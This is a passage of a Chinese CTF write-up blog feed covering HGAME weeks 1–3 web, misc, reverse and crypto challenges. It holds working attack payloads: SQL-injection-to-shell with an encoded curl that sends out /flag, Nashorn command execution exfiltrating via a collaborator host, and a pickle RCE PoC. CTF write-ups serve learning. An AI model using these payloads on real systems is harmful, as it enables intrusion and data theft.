class="string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime(); rt.exec(cmd);<span class="string">&#x27;,HEXTORAW(&#x27;</span><span class="number">007d</span><span class="string">&#x27;)); CALL EXEC(&#x27;</span>bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLjhsazlqMi5jZXllLmlvLw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure><br>下面我们来分析一下payload首先我们使用堆叠注入，这样使得我们的语句可以被执行，但是由于该题使用的sql查询函数，只会返回第一个查询的对象，所以虽然将所有查询都执行了，但是其无法回显。所以我们需要使用反弹shell，使用DNS通道来带出指令。<br>一开始我是准备使用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://`cat /flag` xxxxxx.dnslog.xx</span><br></pre></td></tr></table></figure><br>来进行dns外带的，结果发现，无法外带，查了一下才发现，我们使用的是exec还是来进行命令执行而反引号``是liunx的shell才能使用的，使用我们使用了<code>bash -c &#123;echo,Y3VybCAgaHR0cDovL2BjYXQgL2ZsYWdgLjhsazlqMi5jZXllLmlvLw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code>这句代码使用了bash -c将后面的当成bash代码执行，而后面的base64编码前的内容是<code>curl http://`cat /flag` xxxxxx.dnslog.xx</code>。我们使用管道符将bash64编码的内容进行解密传输执行。最后就成功外带了。</p>
<h1 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h1><p>这道题目我个人感觉是两周来比较简单的题目了。<br>我们首先查一下什么是cow say发现其再是一个linux的指令，我们输入什么其返回什么，那么我们尝试一些可不可以直接rce，发现其可以rce，那么接下来结束绕waf了<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`tac /fl*/fl*`</span><br></pre></td></tr></table></figure></p>
<h1 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h1><p>打开靶场，发现要登陆其用户已经给了，所以我们直接爆破，这道题目比较烦的就是这个爆破，我换了好几个字典才爆破出来。<br><img src="/2024/02/08/hgameweek2/3.png" class="" title="alt text"><br>点开其要求我们帮忙选课，但是其学分修满了就需要使用扩学分，但是绩点不足无法修，但是提示你需要与时间赛跑，那么我们可以猜测其应该为条件竞争。<br>其后端大概为先开启扩学分，后检测其绩点的多少，最后不足删除，这是我们就可以使用bp进行重复发生扩学分请求，再选课即可。</p>
<h1 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h1><p>我们查看源码，发现其ssion是使用时间戳进行标签的，这时候我们就可以使用工具进行伪造ssion，时间戳就是我们开启靶机的时间。<br>伪造好后就是pickle-rce<br>poc如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line">a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbigndGFjIC9mbGFnJykucmVhZCgplIWUUpQu</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-week1</title>
    <url>/2024/01/30/hgame-week1/</url>
    <content><![CDATA[<h1 id="第一周我就有点开摆了，只吧web，逆向，和杂项给ak了（其他都懒得写了），密码只写了个rsa算法的题目，对rsa算法有了一些了解。下周要打起精神了，不能摆下去了。"><a href="#第一周我就有点开摆了，只吧web，逆向，和杂项给ak了（其他都懒得写了），密码只写了个rsa算法的题目，对rsa算法有了一些了解。下周要打起精神了，不能摆下去了。" class="headerlink" title="第一周我就有点开摆了，只吧web，逆向，和杂项给ak了（其他都懒得写了），密码只写了个rsa算法的题目，对rsa算法有了一些了解。下周要打起精神了，不能摆下去了。"></a>第一周我就有点开摆了，只吧web，逆向，和杂项给ak了（其他都懒得写了），密码只写了个rsa算法的题目，对rsa算法有了一些了解。下周要打起精神了，不能摆下去了。</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="1-2048-16"><a href="#1-2048-16" class="headerlink" title="1.2048*16"></a>1.2048*16</h2><p>这道题目我们打开一个发现是一个2048的游戏，题目要求我们组合出32768这一个方块。我们查看源码会发现，该题目对源码进行了混淆，非常难看。<br><img src="/2024/01/30/hgame-week1/1.png" class="" title="alt text"><br>我们先进行常规搜索。如搜索alert，flag，32768都没有用<br>但是这道题目在下方给出了，2048这个游戏的原地址，那么这个游戏肯定是将2048进行了一些魔改。我们点开2048一些的原址，f12查看源码<br>搜索2048我们会发现一个变量e.value，我们虽然不知道这个e变量是什么但是我们可以进行调试，我们先在这一含加一个断点，运行<br><img src="/2024/01/30/hgame-week1/2.png" class="" title="alt text"><br>我们可以发现这个e里含有value，x和y，而且value值为2那么我们可以猜测一下，这个就是方块这个元素，xy代表位置和value代表值，我们尝试在控制台修改e.value的值，<br><img src="/2024/01/30/hgame-week1/3.png" class="" title="aaa"><br>取消断点，运行程序发现<br><img src="/2024/01/30/hgame-week1/4.png" class="" title="alt text"><br>多了个2048的方块。那么我们只要在我们的题目里找到e.value然后进行修改即可。<br>我们点开题目的控制台会发现其无线debug导致我们无法调试<br><img src="/2024/01/30/hgame-week1/5.png" class="" title="alt text"><br>在查了后发现我们可以输入如下代码解决，这个贼恶心，卡了我半天。<br><img src="/2024/01/30/hgame-week1/6.png" class="" title="alt text"><br>解决了放反调试后，我们搜索2048,会发现<br><img src="/2024/01/30/hgame-week1/7.png" class="" title="alt text"><br>虽然长的很抽象但是对比2048的源码我们可以看出来<code>x[n(476)]</code>就是e.value接下来就是重复上述步骤了。<br>注意该游戏不能直接该出32768的方块需要改出两个16384的进行组合。</p>
<h2 id="2-bybassit"><a href="#2-bybassit" class="headerlink" title="2.bybassit"></a>2.bybassit</h2><p>这道题目我们点开发现有一个注册，我们点开这个注册页面，会发现无法注册，但是我们发现其弹出的页面是js的alert弹窗，我们打开源码，果然是js搞的鬼<br><img src="/2024/01/30/hgame-week1/8.png" class="" title="alt text"><br>这个代码当我们点击注册时会触发，会将我们重定向会登陆界面，只要禁用js就可以了，注册后登陆（记得把js重新打开），之后就可以得到flag了</p>
<h2 id="3-ezHTTP"><a href="#3-ezHTTP" class="headerlink" title="3.ezHTTP"></a>3.ezHTTP</h2><img src="/2024/01/30/hgame-week1/9.png" class="">
<p>用referer<br><img src="/2024/01/30/hgame-week1/10.png" class="" title="alt text"><br>改ua头<br><img src="/2024/01/30/hgame-week1/11.png" class="" title="alt text"><br>这个改ip的标头有很多，在网上搜一下之后一个一个试，</p>
<h2 id="4-Select-Courses"><a href="#4-Select-Courses" class="headerlink" title="4.Select Courses"></a>4.Select Courses</h2><p>这道题目是我在没什么思路是随便点发现竟然选上了，思考了一下猜测是点击次数过多导致服务器处理不过来，所有我们直接抓包发包爆破即可</p>
<h2 id="5-jhat"><a href="#5-jhat" class="headerlink" title="5.jhat"></a>5.jhat</h2><p>这道题目，提示需要进行rce，我们先点开，发现有一个oql的搜索框我们先随便搜索一下<br>发现报错了<br><img src="/2024/01/30/hgame-week1/12.png" class="" title="alt text"><br>在网上查一下这个报错发现这个是Nashorn JavaScript的报错<br>既然存在报错那么我们是不是可以使用java语句呢？尝试一下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var command = [&quot;bash&quot;, &quot;-c&quot;,&quot;cat flag&quot;];</span><br><span class="line">var processBuilder = new java.lang.ProcessBuilder(command);</span><br></pre></td></tr></table></figure><br>返回为NULL没有报错证明了该代码执行成功，但是没有回显，这时我们需要使用DNS外带得到数据，我用的是bp的Collaborator模块，</p>
<p>4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.com是在Collaborator剪切的<br><img src="/2024/01/30/hgame-week1/13.png" class="" title="alt text"><br>我们只要ping这个地址就会产生日志，而我们使用如下方式ping就会将数据外带<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;ping `cat flag`.4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.com&quot;</span><br></pre></td></tr></table></figure><br>paylaod如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var command = [&quot;bash&quot;, &quot;-c&quot;, &quot;ping `cat flag`.4rwou6b6sy9z97sdtq2gu6umjdp5dw5ku.oastify.com&quot;];</span><br><span class="line">var processBuilder = new java.lang.ProcessBuilder(command).start();</span><br></pre></td></tr></table></figure><br><img src="/2024/01/30/hgame-week1/14png.png" class="" title="alt text"><br>成功外带flag</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>发个公众号就可以了</p>
<h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>用你的时间打开这个附件，斜着看就可以了，当然也可以用工具调透视。</p>
<h2 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h2><p>看题目描述我们可以猜测需要用到希尔加密<br>附件是一个图片格式为png，用010打开附件我们可以看到其最尾部不为图片的文件尾<br>文件头尾如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">后缀名     文件头    文件尾</span><br><span class="line">jpg/jpeg ffd8ffe0   ffd9</span><br><span class="line">png      89504e47   ae426082</span><br><span class="line">gif    474946383961 003b</span><br><span class="line">zip    504b0304     504b</span><br><span class="line">rar    52617221     无</span><br></pre></td></tr></table></figure><br><img src="/2024/01/30/hgame-week1/15.png" class="" title="alt text"><br>我们可以很明显的看到图片的文件尾后还有一端，其开头为504b0304为zip文件，我们直接将其提取出来。解压后是一串密文，根据题目的描述我们可以猜测着个为希尔加密后的密文，那么我们只要找到key就应该可以得到flag了。<br>再将图片塞入StegSolve可以发现报错了，那么我们猜测这个文件的宽高应该被修改了（其实直接看文件的长宽也可以猜出来因为1444x1444太不吉利了），我们可以利用图片的CRC校验码解析修复，这里直接贴脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    m=f.read()</span><br><span class="line">sign=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c=m[<span class="number">12</span>:<span class="number">16</span>]+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc=binascii.crc32(c)&amp;<span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc==<span class="number">0x121B804D</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br><span class="line">            sign=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> sign==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>利用上述脚本计算出宽高修改即可。<br>代表图片宽高的是IHDR后一个字节的16进制数前后4比特各代表了宽高<br><img src="/2024/01/30/hgame-week1/16.png" class="" title="alt text"><br>修复后扔到StegSolve利用LSB来查看隐写的内容<br><img src="/2024/01/30/hgame-week1/17.png" class="" title="alt text"><br>之后就直接使用bugku的希尔解密就可以得到弗拉格</p>
<h2 id="simple-attackk"><a href="#simple-attackk" class="headerlink" title="simple_attackk"></a>simple_attackk</h2><p>查看附件，有一个压缩包和一个图片<br>使用Bandizip查看文件，可以发现zip的压缩算法，并且压缩包内部有一个和另一个附件完全相同的图片，那么我们可以考虑使用明文爆破。<br>明文爆破需要使用相同的加密算法即压缩后的图片下面三项要与破密压缩包的相同<br><img src="/2024/01/30/hgame-week1/18.png" class="" title="alt text"><br>这里我用的是ARCHPR来明文爆破<br><img src="/2024/01/30/hgame-week1/19.png" class="" title="alt text"><br>只要能开始解密即代表，加密算法等相同<br>开始解密后直接点击停止，只要能停止一般就代表破译成功<br>解密压缩包后点卡文本<br><img src="/2024/01/30/hgame-week1/20.png" class="" title="alt text"><br>提示我们这是一个base64加密的图片，直接搜索base64转图片的网站即可得到flag</p>
<h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><p>得到附件，题目描述需要解密，这里我们需要使用一个解密工具叫Stegseek，这个工具是一个非常强大的解密软件，每秒可以跑百万个密码，可以快速的跑完一个非常强大的字典<br>使用他的-sf即可进行爆破<br><img src="/2024/01/30/hgame-week1/21.png" class="" title="alt text"><br>得到密码后再使用steghide进行解密<br>提取出来后为压缩文件解压后，为一个web源码和图片。<br><img src="/2024/01/30/hgame-week1/23.png" class="" title="alt text"><br><img src="/2024/01/30/hgame-week1/24.png" class="" title="alt text"><br>该图片是一串密文，根据题目描述，我们去该游戏的官网查看，可以发现该文字为游戏的文字。我们打开f12查找ttf文件(ttf文件是一种字体文件)找到后下载，上传到题目给的web页面进行解析，再输入宽输入字母和下划线，一一对照就能破解出flag。</p>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="说实话这个week1的逆向是真的够简单的我零基础，只是再网上稍微查一下就轻松ak了"><a href="#说实话这个week1的逆向是真的够简单的我零基础，只是再网上稍微查一下就轻松ak了" class="headerlink" title="说实话这个week1的逆向是真的够简单的我零基础，只是再网上稍微查一下就轻松ak了"></a>说实话这个week1的逆向是真的够简单的我零基础，只是再网上稍微查一下就轻松ak了</h2><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>没什么好说的直接塞到IDA里就是flag</p>
<h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>我们得到附件放到Exeinfo查看其信息<br><img src="/2024/01/30/hgame-week1/25.png" class="" title="alt text"><br>我们可以看到是用UPX打包的，我们直接再网上下载UPX对其进行脱壳。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPX -d 文件相对地址</span><br></pre></td></tr></table></figure><br>脱壳后使用IDA打开文件，转成伪c代码，发现是<br><img src="/2024/01/30/hgame-week1/26.png" class="" title="alt text"><br>我们输入的字符异或上0x32等于变量byte_1400022A0即为flag，一个数异或两次就会变回原来的数。<br>我们双击byte_1400022A0然后SHIFT+e就可以提取其值，然后将每个值都异或上0x32即可得到flag脚本如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=[<span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x73</span>,<span class="number">0x60</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x5D</span>,<span class="number">0x45</span>, <span class="number">0x13</span>, <span class="number">0x6B</span>, <span class="number">0x02</span>,<span class="number">0x47</span>, <span class="number">0x6D</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>,<span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x5E</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, <span class="number">0x6D</span>, <span class="number">0x67</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rang(<span class="number">100</span>)</span><br><span class="line">flag+=(c[i]^<span class="number">0x32</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>打开文件是一个汇编语言<br><img src="/2024/01/30/hgame-week1/28.png" class="" title="alt text"><br>其大致意思就是输入的字符异或上0x22等于c即为flag，那么同样直接写脚本即可</p>
<h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>这是一个python的脱壳我们将文件托入Exeinfo查看器打包信息<br><img src="/2024/01/30/hgame-week1/29.png" class="" title="alt text"><br>可以发现这是由PyInstaller进行打包的文件<br>我们可以使用pyinstxtractor.py进行提取</p>
<h3 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1."></a>步骤1.</h3><p>将需脱壳文件和pyinstxtractor.py文件置于同一文件夹内,在该路径内打开cmd</p>
<h3 id="步骤2-获取pyc文件"><a href="#步骤2-获取pyc文件" class="headerlink" title="步骤2.获取pyc文件"></a>步骤2.获取pyc文件</h3><p>python pyinstxtractor.py ezPYC.exe<br>就会再文件里输出ezPYC.exe_extracted文件夹，同时也可以看到pyinstaller和python的版本</p>
<h3 id="步骤3修复Magic-Head"><a href="#步骤3修复Magic-Head" class="headerlink" title="步骤3修复Magic Head"></a>步骤3修复Magic Head</h3><p>一般而言,使用pyinstxtractor解包会自动修复MagicHead,如果没有自动修复则手动修复</p>
<p>在文件夹内找到ezPYC.pyc和struct.pyc文件,用winhex或者010editor打开,将struct文件的第一行(Magic head)复制到stream.pyc的最前面,保存更改</p>
<p>之后再用IDA打开ezPYC.pyc文件即可查看main函数内容，转成伪c代码即可发现其还是异或。</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>关于rsa算法可以查看这个文章我个人认为写的非常好，这个文章将rsa算法的前置知识讲的很清楚，<a href="https://blog.csdn.net/wjiabin/article/details/85228078">RSA算法</a><br>我们打开附件<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><br>发现其泄露了<code>q^p%n</code>和<code>p^q%n</code><br>根据范马小定理<br><img src="/2024/01/30/hgame-week1/30.png" class="" title="alt text"><br>由于pq互质所以<code>q^p-1%n=1</code>两边同时乘上q得<code>q^p%n=q</code>另一个同理则我们得到了q和p的值。<br>我们就可以根据p和q还有e算出密钥d，我们只要求e对(q-1)(p-q)的模反元素即可脚本如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from binascii import a2b_hex, b2a_hex</span><br><span class="line"></span><br><span class="line">flag = &quot;*****************&quot;</span><br><span class="line"></span><br><span class="line">p = 149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br><span class="line">q = 116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br><span class="line">c = 10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><span class="line">e = 65537</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(int(m)))</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>hgameweek3</title>
    <url>/2024/02/26/hgameweek3/</url>
    <content><![CDATA[<h1 id="说起来很可耻这周的hgame我没有打，这篇博客只能算我的赛后复现，过个年把人给过的太颓废了。"><a href="#说起来很可耻这周的hgame我没有打，这篇博客只能算我的赛后复现，过个年把人给过的太颓废了。" class="headerlink" title="说起来很可耻这周的hgame我没有打，这篇博客只能算我的赛后复现，过个年把人给过的太颓废了。"></a>说起来很可耻这周的hgame我没有打，这篇博客只能算我的赛后复现，过个年把人给过的太颓废了。</h1><h1 id="webvpn"><a href="#webvpn" class="headerlink" title="webvpn"></a>webvpn</h1><p>说实话这道题目不算太难，虽然我是看了wp先入为主说的话。首先这道题目需要使用js反序列化，在看wp的时候我都已经把之前学js原型链污染的内容忘了一大半了。<a href="https://lisien11.github.io/2024/01/28/%E5%88%9D%E6%8E%A2JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">初探js原型链污染</a><br>题目给了源码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> session_name = <span class="string">&quot;my-webvpn-session-id-&quot;</span> + <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;pug&quot;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;trust proxy&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;public&quot;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line">  <span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: session_name,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>(),</span><br><span class="line">    <span class="attr">secure</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">if</span> (!username) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> url = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">query</span>.<span class="property">url</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;invalid url.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = req.<span class="property">headers</span>;</span><br><span class="line">    headers.<span class="property">host</span> = url.<span class="property">host</span>;</span><br><span class="line">    headers.<span class="property">cookie</span> = headers.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">cookie</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> filtered_cookie = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> [key, value] = cookie.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">trim</span>() !== session_name) &#123;</span><br><span class="line">        filtered_cookie += <span class="string">`<span 